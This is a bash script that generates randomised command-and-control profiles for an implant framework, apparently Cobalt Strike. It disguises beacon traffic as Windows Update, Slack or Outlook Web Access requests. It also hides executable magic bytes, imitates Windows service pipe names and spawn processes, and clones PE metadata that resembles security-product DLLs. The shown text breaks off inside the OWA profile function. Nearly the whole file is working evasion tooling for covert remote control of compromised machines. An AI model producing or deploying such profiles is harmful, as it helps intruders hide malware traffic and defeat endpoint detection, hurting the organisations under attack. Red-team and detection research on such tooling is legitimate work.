#!/bin/bash

read -p "What will the name of your profile be?: " prof_name
read -p "What's the domain you're using? e.g. tld.domain: " domain_name
read -p "What profile do you want? 1) Windows update 2) Slack 3) OWA (number only): " profile_selection
read -p "What is your sleep value (milliseconds, 60000=1 minute)?: " sleep
read -p "What is the jitter value (only numbers pls)?: " jitter


#generate the prepend byte values for x64 and x86 payloads to obfuscate the magic bytes.
prepend_bytes=("40" "41" "42" "6690" "40" "43" "44" "45" "46" "47" "48" "49" "4c" "90" "0f1f00" "660f1f0400" "0f1f0400" "0f1f00" "0f1f00" "87db" "87c9" "87d2" "6687db" "6687c9" "6687d2")

split_into_chunks() {
    local value=$1
    while [ -n "$value" ]; do
        echo -n "${value:0:2} "
        value=${value:2}
    done
}

processed_bytes=()
for val in "${prepend_bytes[@]}"; do
    if [ ${#val} -gt 2 ]; then
        for chunk in $(split_into_chunks "$val"); do
            processed_bytes+=("\\x$chunk")
        done
    else
        processed_bytes+=("\\x$val")
    fi
done

shuffled_bytes_x64=$(printf "%s\n" "${processed_bytes[@]}" | sort -R | tr -d '\n')
shuffled_bytes_x642=$(printf "%s\n" "${processed_bytes[@]}" | sort -R | tr -d '\n')
shuffled_bytes_x86=$(printf "%s\n" "${processed_bytes[@]}" | sort -R | tr -d '\n')
shuffled_bytes_x862=$(printf "%s\n" "${processed_bytes[@]}" | sort -R | tr -d '\n')

#-------------------------------------------------------------------------------------

user_agents=(
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4242.0 Safari/537.36"
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4301.0 Safari/537.36"
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.133 Safari/537.36"
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4390.0 Safari/537.36"
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36"
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4474.0 Safari/537.36"
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4562.0 Safari/537.36"
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3818.0 Safari/537.36 Edg/77.0.188.0"
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36 Edg/78.0.276.20"
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3943.0 Safari/537.36 Edg/79.0.308.1"
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.0 Safari/537.36 Edg/80.0.361.0"
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36 Edg/80.0.361.66"
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.34 Safari/537.36 Edg/81.0.416.20"
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4063.0 Safari/537.36 Edg/82.0.439.1"
	"Mozilla/5.0 (X11; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0"
	"Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0"
	"Mozilla/5.0 (X11; Linux x86_64:71.0) Gecko/20100101 Firefox/71.0"
	"Mozilla/4.0 (X11; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0"
	"Mozilla/5.0 (X11; Linux x86_64:75.0) Gecko/20100101 Firefox/75.0"
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"
	"Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4065.1 Safari/537.36"
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/80.0.3987.99 Safari/537.31"
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36"
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.131 Safari/537.36"
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.10 Safari/537.36"
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.130 Safari/537.36"
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36"	
	)
selected_useragent=${user_agents[ $RANDOM % ${#user_agents[@]} ]}

data_jitter=$(echo $((25 + $RANDOM % 69)))

rand_pipe=$(echo $((3000 + $RANDOM % 9000)))
rand_pipe_stager=$(echo $((1000 + $RANDOM % 9000)))
pipe_names=(
	"SapIServerPipes-1-5-5-0"
	"epmapper-"
	"atsvc-"
	"plugplay+"
	"srvsvc-1-5-5-0"
	"W32TIME_ALT_"
	"tapsrv_"
	"Printer_Spools_"
	)
selected_pipename=${pipe_names[ $RANDOM % ${#pipe_names[@]} ]}

ssh_banner=(
	"Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-1029-aws x86_64)"
	"Welcome to Ubuntu 19.10.0 LTS (GNU/Linux 4.4.0-19037-aws x86_64)"
	"Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 5.3.0-1035-aws x86_64)"
	"Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1065-aws x86_64)"
	"OpenSSH_7.4 Debian (protocol 2.0)"
	"OpenSSH_8.6 Debian (protocol 2.0)"
	"OpenSSH_7. Debian (protocol 2.0)"
	"OpenSSH_7.4 Debian (protocol 2.0)"
	)
selected_ssh_banner=${ssh_banner[ $RANDOM % ${#ssh_banner[@]} ]}

MZx86=(
	IA
	JB
	ME
	IA
	H@
	KC
	)
selected_MZ86=${MZx86[ $RANDOM % ${#MZx86[@]} ]}
selected_MZ862=${MZx86[ $RANDOM % ${#MZx86[@]} ]}

MZx64=(
	AX
	AP
	AY
	AQ
	AZ
	AR
	A\[
	AS
	AT
	A\]
	AU
	A\^
	AV
	A\_
	AW
	XP
	YQ
	ZR
	\[S
	\]U
	\^V
	\_W
	\^W
	\_R
	)
selected_MZ64=${MZx64[ $RANDOM % ${#MZx64[@]} ]}
selected_MZ642=${MZx64[ $RANDOM % ${#MZx64[@]} ]}

pe_clone=(
   '	set checksum       "0";
	set compile_time   "11 Nov 2016 04:08:32";
	set entry_point    "650688";
	set image_size_x86 "4661248";
	set image_size_x64 "4661248";
	set name   "srv.dll";
	set rich_header    "\x3e\x98\xfe\x75\x7a\xf9\x90\x26\x7a\xf9\x90\x26\x7a\xf9\x90\x26\x73\x81\x03\x26\xfc\xf9\x90\x26\x17\xa4\x93\x27\x79\xf9\x90\x26\x7a\xf9\x91\x26\x83\xfd\x90\x26\x17\xa4\x91\x27\x65\xf9\x90\x26\x17\xa4\x95\x27\x77\xf9\x90\x26\x17\xa4\x94\x27\x6c\xf9\x90\x26\x17\xa4\x9e\x27\x56\xf8\x90\x26\x17\xa4\x6f\x26\x7b\xf9\x90\x26\x17\xa4\x92\x27\x7b\xf9\x90\x26\x52\x69\x63\x68\x7a\xf9\x90\x26\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";' 
	
    '	set checksum       "0";
	set compile_time   "25 Jan 2020 23:17:33";
	set entry_point    "217152";
	set image_size_x86 "1077248";
	set image_size_x64 "1077248";
	set name           "DIAGCPL.dll";
	set rich_header    "\x2d\xf1\x0e\x49\x69\x90\x60\x1a\x69\x90\x60\x1a\x69\x90\x60\x1a\x32\xf8\x64\x1b\x7c\x90\x60\x1a\x32\xf8\x63\x1b\x6a\x90\x60\x1a\x32\xf8\x65\x1b\x6a\x90\x60\x1a\x69\x90\x61\x1a\xba\x91\x60\x1a\x32\xf8\x61\x1b\x4a\x90\x60\x1a\x32\xf8\x60\x1b\x68\x90\x60\x1a\x32\xf8\x69\x1b\x59\x90\x60\x1a\x32\xf8\x9f\x1a\x68\x90\x60\x1a\x32\xf8\x62\x1b\x68\x90\x60\x1a\x52\x69\x63\x68\x69\x90\x60\x1a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";'
	
    '	set checksum       "0";
	set compile_time   "17 Nov 2003 16:56:11";
	set entry_point    "194608";
	set image_size_x86 "770048";
	set image_size_x64 "770048";
	set name           "Windows.Storage.Search.dll";
	set rich_header    "\xa9\xbc\xd1\xd5\xed\xdd\xbf\x86\xed\xdd\xbf\x86\xed\xdd\xbf\x86\xe4\xa5\x2c\x86\x99\xdd\xbf\x86\xb6\xb5\x42\x86\xfa\xdd\xbf\x86\xb6\xb5\xbc\x87\xee\xdd\xbf\x86\xb6\xb5\xbb\x87\xf1\xdd\xbf\x86\xed\xdd\xbe\x86\xbe\xdf\xbf\x86\xb6\xb5\xbe\x87\xe4\xdd\xbf\x86\xb6\xb5\xba\x87\xee\xdd\xbf\x86\xb6\xb5\xbf\x87\xec\xdd\xbf\x86\xb6\xb5\xb1\x87\x8a\xdd\xbf\x86\xb6\xb5\x40\x86\xec\xdd\xbf\x86\xb6\xb5\xbd\x87\xec\xdd\xbf\x86\x52\x69\x63\x68\xed\xdd\xbf\x86\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";'
		
	'	set checksum       "0";
	set compile_time   "10 Aug 2018 19:22:06";
	set entry_point    "869360";
	set image_size_x86 "1638400";
	set image_size_x64 "1638400";
	set name           "libcrypto.dll";
	set rich_header  "\xbe\xf7\xf9\xa0\xfa\x96\x97\xf3\xfa\x96\x97\xf3\xfa\x96\x97\xf3\x89\xf4\x93\xf2\xf0\x96\x97\xf3\x89\xf4\x94\xf2\xfc\x96\x97\xf3\x89\xf4\x92\xf2\x52\x96\x97\xf3\x64\x36\x50\xf3\xf2\x96\x97\xf3\x28\xf2\x94\xf2\xf3\x96\x97\xf3\x28\xf2\x92\xf2\xef\x96\x97\xf3\x28\xf2\x93\xf2\xeb\x96\x97\xf3\xf3\xee\x04\xf3\xc9\x96\x97\xf3\xfa\x96\x96\xf3\x7d\x96\x97\xf3\x11\xf2\x93\xf2\xd4\x94\x97\xf3\x11\xf2\x97\xf2\xfb\x96\x97\xf3\x11\xf2\x68\xf3\xfb\x96\x97\xf3\xfa\x96\x00\xf3\xfb\x96\x97\xf3\x11\xf2\x95\xf2\xfb\x96\x97\xf3\x52\x69\x63\x68\xfa\x96\x97\xf3\x00\x00\x00\x00\x00\x00\x00\x00";'
		
    '	set checksum       "0";
	set compile_time   "05 Nov 2018 23:03:21";
	set entry_point    "657360";
	set image_size_x86 "880640";
	set image_size_x64 "880640";
	set name           "winsqlite3.dll";
	set rich_header    "\xe5\x3e\x6d\xff\xa1\x5f\x03\xac\xa1\x5f\x03\xac\xa1\x5f\x03\xac\x9a\x01\x00\xad\xa7\x5f\x03\xac\x9a\x01\x06\xad\xb7\x5f\x03\xac\x9a\x01\x07\xad\xac\x5f\x03\xac\xa8\x27\x90\xac\x92\x5f\x03\xac\xa1\x5f\x02\xac\xd8\x5f\x03\xac\x36\x01\x07\xad\xa0\x5f\x03\xac\x36\x01\x03\xad\xa0\x5f\x03\xac\x33\x01\xfc\xac\xa0\x5f\x03\xac\x36\x01\x01\xad\xa0\x5f\x03\xac\x52\x69\x63\x68\xa1\x5f\x03\xac\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";'
			
    '	set checksum       "0";
	set compile_time   "02 Feb 2020 19:59:15";
	set entry_point    "1056672";
	set image_size_x86 "1785856";
	set image_size_x64 "1785856";
	set name           "WWANSVC.DLL";
	set rich_header    "\x77\xf3\x15\x7d\x33\x92\x7b\x2e\x33\x92\x7b\x2e\x33\x92\x7b\x2e\x3a\xea\xe8\x2e\xb3\x92\x7b\x2e\x68\xfa\x7f\x2f\x3c\x92\x7b\x2e\x68\xfa\x78\x2f\x30\x92\x7b\x2e\x68\xfa\x7e\x2f\x2d\x92\x7b\x2e\x33\x92\x7a\x2e\xf8\x97\x7b\x2e\x68\xfa\x7a\x2f\x3e\x92\x7b\x2e\x68\xfa\x7b\x2f\x32\x92\x7b\x2e\x68\xfa\x72\x2f\xa9\x92\x7b\x2e\x68\xfa\x86\x2e\x32\x92\x7b\x2e\x68\xfa\x84\x2e\x32\x92\x7b\x2e\x68\xfa\x79\x2f\x32\x92\x7b\x2e\x52\x69\x63\x68\x33\x92\x7b\x2e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";'
	
    '	set checksum       "164653";
	set compile_time   "06 Nov 2020 18:42:28";
	set entry_point    "63072";
	set name           "CyMemDef64.dll";
	set rich_header    "\x5f\x64\xdb\xae\x1b\x05\xb5\xfd\x1b\x05\xb5\xfd\x1b\x05\xb5\xfd\x1b\x05\xb4\xfd\x30\x05\xb5\xfd\xe7\x72\x0c\xfd\x18\x05\xb5\xfd\x7d\xeb\x66\xfd\x07\x05\xb5\xfd\x3c\xc3\x78\xfd\x1a\x05\xb5\xfd\x7d\xeb\x7f\xfd\x1a\x05\xb5\xfd\x3c\xc3\x7c\xfd\x1a\x05\xb5\xfd\x1b\x05\x22\xfd\x1a\x05\xb5\xfd\x7d\xeb\x79\xfd\x1a\x05\xb5\xfd\x52\x69\x63\x68\x1b\x05\xb5\xfd\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";'
	
    '	set checksum       "1968945";
	set compile_time   "26 Jul 2021 18:09:30";
	set entry_point    "1099888";
	set image_size_x86 "2072576";
	set image_size_x64 "2072576";
	set name           "InProcessClient.dll";
	set rich_header    "\xd5\x71\x0e\xb3\x91\x10\x60\xe0\x91\x10\x60\xe0\x91\x10\x60\xe0\x85\x7b\x63\xe1\x84\x10\x60\xe0\x85\x7b\x65\xe1\x24\x10\x60\xe0\x48\x64\x64\xe1\x83\x10\x60\xe0\x48\x64\x63\xe1\x9d\x10\x60\xe0\xf7\x7f\x9d\xe0\x92\x10\x60\xe0\x4a\x64\x61\xe1\x93\x10\x60\xe0\x85\x7b\x64\xe1\xb2\x10\x60\xe0\x85\x7b\x61\xe1\x94\x10\x60\xe0\x48\x64\x65\xe1\x0e\x10\x60\xe0\xfb\x78\x65\xe1\x80\x10\x60\xe0\x85\x7b\x66\xe1\x93\x10\x60\xe0\x91\x10\x61\xe0\x5c\x11\x60\xe0\x4a\x64\x69\xe1\x03\x10\x60\xe0\x4a\x64\x63\xe1\x93\x10\x60\xe0\x4a\x64\x60\xe1\x90\x10\x60\xe0\x4a\x64\x9f\xe0\x90\x10\x60\xe0\x91\x10\xf7\xe0\x90\x10\x60\xe0\x4a\x64\x62\xe1\x90\x10\x60\xe0\x52\x69\x63\x68\x91\x10\x60\xe0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";'
    
    '	set checksum       "2817694";
	set compile_time   "19 May 2021 13:31:53";
	set entry_point    "1253200";
	set image_size_x86 "2863104";
	set image_size_x64 "2863104";
	set name           "ctiuser.dll";
	set rich_header    "\x15\xd9\xb0\x30\x51\xb8\xde\x63\x51\xb8\xde\x63\x51\xb8\xde\x63\x45\xd3\xda\x62\x47\xb8\xde\x63\x45\xd3\xdd\x62\x5f\xb8\xde\x63\x45\xd3\xdb\x62\x90\xb8\xde\x63\xcf\x18\x19\x63\x52\xb8\xde\x63\xa9\xc8\xda\x62\x40\xb8\xde\x63\xa9\xc8\xdd\x62\x5b\xb8\xde\x63\xa9\xc8\xdb\x62\xdf\xb8\xde\x63\x45\xd3\xdf\x62\x54\xb8\xde\x63\x45\xd3\xd8\x62\x53\xb8\xde\x63\x51\xb8\xdf\x63\x29\xb9\xde\x63\xe9\xc9\xda\x62\x69\xb8\xde\x63\xe9\xc9\xdb\x62\x13\xb8\xde\x63\xe9\xc9\xde\x62\x50\xb8\xde\x63\xe9\xc9\x21\x63\x50\xb8\xde\x63\x51\xb8\x49\x63\x50\xb8\xde\x63\xe9\xc9\xdc\x62\x50\xb8\xde\x63\x52\x69\x63\x68\x51\xb8\xde\x63\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";'
	
    '	set checksum       "83724";
	set compile_time   "05 Aug 2020 16:06:20";
	set entry_point    "5664";
	set name           "umppc.dll";
	set rich_header    "\xba\xf0\x63\x99\xfe\x91\x0d\xca\xfe\x91\x0d\xca\xfe\x91\x0d\xca\x92\xf9\x0e\xcb\xff\x91\x0d\xca\x92\xf9\x05\xcb\xf3\x91\x0d\xca\x9b\xf7\x0e\xcb\xfc\x91\x0d\xca\x9b\xf7\x09\xcb\xfb\x91\x0d\xca\x9b\xf7\x0c\xcb\xfd\x91\x0d\xca\xfe\x91\x0c\xca\xc6\x91\x0d\xca\x92\xf9\x0d\xcb\xff\x91\x0d\xca\x92\xf9\xf2\xca\xff\x91\x0d\xca\x92\xf9\x0f\xcb\xff\x91\x0d\xca\x52\x69\x63\x68\xfe\x91\x0d\xca\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";'
	)
selected_pe_clone=${pe_clone[ $RANDOM % ${#pe_clone[@]} ]}

min_alloc_val=$(echo $((4096 + $RANDOM % 57841)))

createthread_val=$(echo $((500 + $RANDOM % 2500)))

post_ex_exe=(
	"wmiprvse.exe -Embedding"
	"auditpol.exe"
	"bootcfg.exe"
	"expand.exe"
	"choice.exe"
	"fsutil.exe"
	"gpupdate.exe"
	"dllhost.exe"
	)
selected_post_ex_exe_86=${post_ex_exe[ $RANDOM % ${#post_ex_exe[@]} ]}
selected_post_ex_exe_64=${post_ex_exe[ $RANDOM % ${#post_ex_exe[@]} ]}

randchars() {
    local length=$1
    local chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    local str=''

    for (( i = 0; i < length; i++ )); do
        str+="${chars:RANDOM%${#chars}:1}"
    done

    echo "$str"
}

enduri1=$(randchars 19)
enduri2=$(randchars 19)
enduri3=$(randchars 19)
enduri4=$(randchars 19)
enduri5=$(randchars 19)
enduri6=$(randchars 19)
enduri7=$(randchars 19)
enduri8=$(randchars 19)
enduri9=$(randchars 19)
enduri10=$(randchars 19)
enduriowa1=$(randchars 26)
enduriowa2=$(randchars 26)
enduriowa3=$(randchars 26)
enduriowa4=$(randchars 26)
enduriowa5=$(randchars 26)
enduriowa6=$(randchars 26)
enduriowa7=$(randchars 26)
enduriowa8=$(randchars 26)
enduriowa9=$(randchars 26)
enduriowa10=$(randchars 26)




WinUpdate_func () {
	
	echo "
	http-get {
	set uri \"/c/msdownload/update/others/2023/10/221512_$enduri5 /c/msdownload/update/others/2023/11/227212_$enduri3 /c/msdownload/update/others/2023/09/157212_$enduri1 /c/msdownload/update/others/2023/11/257212_$enduri4 /c/msdownload/update/others/2023/10/221512_$enduri2 \";

	client {

		header \"Accept\" \"*/*\";
		header \"Host\" \"$domain_name\";
		
		metadata {
			base64url;
			append \".cab\";
			uri-append;
		}
	}

	server {
		header \"Content-Type\" \"application/vnd.ms-cab-compressed\";
		header \"Server\" \"Microsoft-IIS/10\";
		header \"MSRegion\" \"N. America\";
		header \"Connection\" \"keep-alive\";
		header \"X-Powered-By\" \"ASP.NET\";

		output {

			print;
		}
	}
	}

	http-post {
	set uri \"/c/msdownload/update/others/2023/10/$enduri7 /c/msdownload/update/others/2023/09/$enduri9 /c/msdownload/update/others/2023/11/$enduri6 /c/msdownload/update/others/2023/11/$enduri10 /c/msdownload/update/others/2023/10/$enduri8 \";


	set verb \"GET\";

	client {

		header \"Accept\" \"*/*\";


		id {
			prepend \"download.windowsupdate.com/c/\";
			header \"Host\";
		}


		output {
			base64url;
			append \".cab\";
			uri-append;
		}
	}

	server {
		header \"Content-Type\" \"application/vnd.ms-cab-compressed\";
		header \"Server\" \"Microsoft-IIS/10\";
		header \"MSRegion\" \"N. America\";
		header \"Connection\" \"keep-alive\";
		header \"X-Powered-By\" \"ASP.NET\";

		output {
			print;
		}
	}
	}

	http-stager {
		server {
			header \"Content-Type\" \"application/vnd.ms-cab-compressed\";
		}
	}
	"
}

Slack_func () {

	maxage=$(echo $((172800 + $RANDOM % 31536001)))
	maxage2=$(echo $((172800 + $RANDOM % 31536001)))
	maxage3=$(echo $((172800 + $RANDOM % 31536001)))

	echo "
		http-get {

		set uri \"/messages/$enduri9 /messages/$enduri3 /messages/$enduri8 /messages/$enduri4 /messages/$enduri6 \";

		client {

			header \"Host\" \"$domain_name\";
		header \"Accept\" \"*/*\";
		header \"Accept-Language\" \"en-US\";
		header \"Connection\" \"close\";

			
			metadata {
			base64url;
			append \";_ga=GA1.2.875\";
			append \";__ar_v4=%8867UMDGS643\";
			prepend \"d=\";
			prepend \"_ga=GA1.2.875;\";
			prepend \"b=.12vPkW22o;\";
			header \"Cookie\";

			}

		}

		server {

		header \"Content-Type\" \"text/html; charset=utf-8\";
		header \"Connection\" \"close\";
		header \"Server\" \"Apache\";
		header \"X-XSS-Protection\" \"0\";
		header \"Strict-Transport-Security\" \"max-age=$maxage; includeSubDomains; preload\";
		header \"Referrer-Policy\" \"no-referrer\";
		header \"X-Slack-Backend\" \"h\";
		header \"Pragma\" \"no-cache\";
		header \"Cache-Control\" \"private, no-cache, no-store, must-revalidate\";
		header \"X-Frame-Options\" \"SAMEORIGIN\";
		header \"Vary\" \"Accept-Encoding\";
		header \"X-Via\" \"haproxy-www-w6k7\";
			

			output {
				base64url;
			prepend \"<!DOCTYPE html>
		<html lang=\\\"en-US\\\" class=\\\"supports_custom_scrollbar\\\">

		<head>

		<meta charset=\\\"utf-8\\\">
		<meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge,chrome=1\\\">
		<meta name=\\\"referrer\\\" content=\\\"no-referrer\\\">
		<meta name=\\\"superfish\\\" content=\\\"nofish\\\">
			<title>Microsoft Developer Chat Slack</title>
		<meta name=\\\"author\\\" content=\\\"Slack\\\">
			

		<link rel=\\\"dns-prefetch\\\" href=\\\"https://a.slack-edge.com?id=\\\";

			append \\\"\\\"> </script>\\\";
			
			append \\\"<div id=\\\"client-ui\\\" class=\\\"container-fluid sidebar_theme_\\\"\\\"\\\">


		<div id=\\\"banner\\\" class=\\\"hidden\\\" role=\\\"complementary\\\" aria-labelledby=\\\"notifications_banner_aria_label\\\">
		<h1 id=\\\"notifications_banner_aria_label\\\" class=\\\"offscreen\\\">Notifications Banner</h1>

		<div id=\\\"notifications_banner\\\" class=\\\"banner sk_fill_blue_bg hidden\\\">
			Slack needs your permission to <button type=\\\"button\\\" class=\\\"btn_link\\\">enable desktop notifications</button>.		<button type=\\\"button\\\" class=\\\"btn_unstyle banner_dismiss ts_icon ts_icon_times_circle\\\" data-action=\\\"dismiss_banner\\\" aria-label=\\\"Dismiss\\\"></button>
		</div>

		<div id=\\\"notifications_dismiss_banner\\\" class=\\\"banner seafoam_green_bg hidden\\\">
			We strongly recommend enabling desktop notifications if you’ll be using Slack on this computer.		<span class=\\\"inline_block no_wrap\\\">
				<button type=\\\"button\\\" class=\\\"btn_link\\\" onclick=\\\"TS.ui.banner.close(); TS.ui.banner.growlsPermissionPrompt();\\\">Enable notifications</button> •
				<button type=\\\"button\\\" class=\\\"btn_link\\\" onclick=\\\"TS.ui.banner.close()\\\">Ask me next time</button> •
				<button type=\\\"button\\\" class=\\\"btn_link\\\" onclick=\\\"TS.ui.banner.closeNagAndSetCookie()\\\">Never ask again on this computer</button>
			</span>
		</div>\";

				print;
			}
		}
		}

		http-post {

		set uri \"/messages/$enduri2 /messages/$enduri10 /messages/$enduri7 /messages/$enduri1 /messages/$enduri5 \";


		client {

		header \"Host\" \"$domain_name\";
		header \"Accept\" \"*/*\";
		header \"Accept-Language\" \"en-US\";     
			
			output {
				base64url;
			
			append \";_ga=GA1.2.875\";
			append \"__ar_v4=%8867UMDGS643\";
			prepend \"d=\";
			prepend \"_ga=GA1.2.875;\";
			prepend \"b=.12vPkW22o;\";
			header \"Cookie\";


			}


			id {
				base64url;
			prepend \"GA1.\";
			header \"_ga\";

			}
		}

		server {

		header \"Content-Type\" \"application/json; charset=utf-8\";
		header \"Connection\" \"close\";
		header \"Server\" \"Apache\";
		header \"Strict-Transport-Security\" \"max-age=$maxage2; includeSubDomains; preload\";
		header \"Referrer-Policy\" \"no-referrer\";
		header \"X-Content-Type-Options\" \"nosniff\";
		header \"X-Slack-Req-Id\" \"6319165c-f976-4d0666532\";
		header \"X-XSS-Protection\" \"0\";
		header \"X-Slack-Backend\" \"h\";
		header \"Vary\" \"Accept-Encoding\";
		header \"Access-Control-Allow-Origin\" \"*\";
		header \"X-Via\" \"haproxy-www-6g1x\";
			

			output {
				base64url;

			prepend \"{\\\"ok\\\":true,\\\"args\\\":{\\\"user_id\\\":\\\"LUMK4GB8C\\\",\\\"team_id\\\":\\\"T0527B0J3\\\",\\\"version_ts\\\":\\\"\";
			append \"\\\"},\\\"warning\\\":\\\"superfluous_charset\\\",\\\"response_metadata\\\":{\\\"warnings\\\":[\\\"superfluous_charset\\\"]}}\";

				print;
			}
		}
		}

		http-stager {

		set uri_x86 \"/messages/DALBNSf25\";
		set uri_x64 \"/messages/DALBNSF25\";

		client {
		header \"Accept\" \"*/*\";
		header \"Accept-Language\" \"en-US,en;q=0.5\";
		header \"Accept-Encoding\" \"gzip, deflate\";
		header \"Connection\" \"close\";
		}

		server {
		header \"Content-Type\" \"text/html; charset=utf-8\";        
		header \"Connection\" \"close\";
		header \"Server\" \"Apache\";
		header \"X-XSS-Protection\" \"0\";
		header \"Strict-Transport-Security\" \"max-age=$maxage3; includeSubDomains; preload\";
		header \"Referrer-Policy\" \"no-referrer\";
		header \"X-Slack-Backend\" \"h\";
		header \"Pragma\" \"no-cache\";
		header \"Cache-Control\" \"private, no-cache, no-store, must-revalidate\";
		header \"X-Frame-Options\" \"SAMEORIGIN\";
		header \"Vary\" \"Accept-Encoding\";
		header \"X-Via\" \"haproxy-www-suhx\";

		}
		}"
}

Owa_func () {

	uvalue=$(echo $((6 + $RANDOM % 15)))
	uvalue2=$(randchars $uvalue)
	namprd=$(echo $((2 + $RANDOM % 8)))
	num86=$(echo $((19340 + $RANDOM % 15370000)))
	num64=$(echo $((19340 + $RANDOM % 15370000)))

	echo "
	http-get {

		set uri \"/owa/$enduriowa1 /owa/$enduriowa2 /owa/$enduriowa3 /owa/$enduriowa4 /owa/$enduriowa5 \";


	client {

	header \"Host\" \"$domain_name\";
	header \"Accept\" \"*/*\";
	header \"Cookie\" \"MicrosoftApplicationsTelemetryDeviceId=95c18d8-4dce9854;ClientId=1C0F6C5D910F9;MSPAuth=3EkAjDKjI;xid=730bf7;wla42=$uvalue2\";
		
		metadata {
			base64url;
			parameter \"wa\";


		}

	parameter \"path\" \"/calendar\";

	}

	server {

	header \"Cache-Control\" \"no-cache\";
	header \"Pragma\" \"no-cache\";
	header \"Content-Type\" \"text/html; charset=utf-8\";
	header \"Server\" \"Microsoft-IIS/10.0\";
	header \"request-id\" \"6cfcf35d-0680-4853-98c4-b16723708fc9\";
	header \"X-CalculatedBETarget\" \"BY2PR06MB549.namprd0$namprd.prod.outlook.com\";
	header \"X-Content-Type-Options\" \"nosniff\";
	header \"X-OWA-Version\" \"15.1.1240.20\";
	header \"X-OWA-OWSVersion\" \"V2017_06_15\";
	header \"X-OWA-MinimumSupportedOWSVersion\" \"V2_6\";
	header \"X-Frame-Options\" \"SAMEORIGIN\";
	header \"X-DiagInfo\" \"BY2PR06MB549\";
	header \"X-UA-Compatible\" \"IE=EmulateIE7\";
	header \"X-Powered-By\" \"ASP.NET\";
	header \"X-FEServer\" \"CY4PR02CA0010\";
	header \"Connection\" \"close\";
		

		output {
			base64url;
			print;
		}
	}
	}

	http-post {

	set uri \"/owa/$enduriowa6 /owa/$enduriowa7 /owa/$enduriowa8 /owa/$enduriowa9 /owa/$enduriowa10 \";
	set verb \"GET\";

	client {

	header \"Host\" \"$domain_name\";
	header \"Accept\" \"*/*\";     
		
		output {
			base64url;
		parameter \"wa\";


		}



		id {
			base64url;

		prepend \"wla42=\";
		prepend \"xid=730bf7;\";
		prepend \"MSPAuth=3EkAjDKjI;\";
		prepend \"ClientId=1C0F6C5D910F9;\";
